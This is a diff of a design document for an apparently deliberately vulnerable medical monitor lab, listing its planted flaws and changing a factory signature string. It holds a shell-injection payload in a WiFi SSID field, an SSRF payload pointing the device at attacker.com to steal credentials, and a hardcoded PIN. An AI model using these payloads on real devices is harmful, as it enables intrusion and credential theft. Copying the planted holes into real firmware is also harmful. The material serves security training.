@@ -289,7 +289,7 @@ The **Factory Provisioning Service** (`0xFF10`) is a secondary GATT channel **no
 > 3. Patient account (`patient_set`)
 > 4. Administrator account (`admin_set`)
 >
-> The monitor then sends its **factory signature** (`CareOtterFactorySig2026`) to the Cloud API via `POST /admin/device/register`, along with the configured accounts and its own WiFi IP. The Cloud API verifies the signature, creates the users in its database, and starts polling vitals over **WiFi** (not Ethernet). Once configured, the patient takes the monitor home. The provisioning channel, however, remains accessible indefinitely.
+> The monitor then sends its **factory signature** (`9C0C306DEF2A`) to the Cloud API via `POST /admin/device/register`, along with the configured accounts and its own WiFi IP. The Cloud API verifies the signature, creates the users in its database, and starts polling vitals over **WiFi** (not Ethernet). Once configured, the patient takes the monitor home. The provisioning channel, however, remains accessible indefinitely.
 
 **GATT Service:**
 
@@ -342,7 +342,7 @@ The **Factory Provisioning Service** (`0xFF10`) is a secondary GATT channel **no
 - **P3 — Hardcoded PIN + No Rate Limiting**: The factory PIN is `6767` on all devices. There is no lockout after N failed attempts, making brute-force trivial.
 - **P4 — Shell Injection (`wifi_set`)**: The `ssid` and `psk` fields are interpolated directly into a `system("uci set wireless…")` command without escaping shell metacharacters. Payload `{"cmd":"wifi_set","ssid":"'; reboot; #'","psk":"x"}` executes arbitrary commands.
 - **P5 — WiFi PSK Leak**: `ReadValue` returns the current WiFi password in plaintext (`wifi_psk`).
-- **P6 — SSRF via `cloud_set` + Signature Interception**: The Cloud API URL is not validated. An attacker can redirect the monitor to an attacker-controlled server (`{"cmd":"cloud_set","url":"http://attacker.com:5002"}`). When the monitor sends its registration POST, the attacker captures the hardcoded factory signature (`CareOtterFactorySig2026`) and both admin/patient credentials, allowing complete backend impersonation or account takeover.
+- **P6 — SSRF via `cloud_set` + Signature Interception**: The Cloud API URL is not validated. An attacker can redirect the monitor to an attacker-controlled server (`{"cmd":"cloud_set","url":"http://attacker.com:5002"}`). When the monitor sends its registration POST, the attacker captures the hardcoded factory signature (`9C0C306DEF2A`) and both admin/patient credentials, allowing complete backend impersonation or account takeover.
 - **P7 — Unauthenticated Factory Reset**: The `factory_reset` command executes on a single write, without confirmation or secondary authentication.
 - **P8 — Missing Temporal Lockout**: The channel should close after 30 minutes (`initialized_at`), but the firmware never checks the elapsed time. The service remains active indefinitely.
 
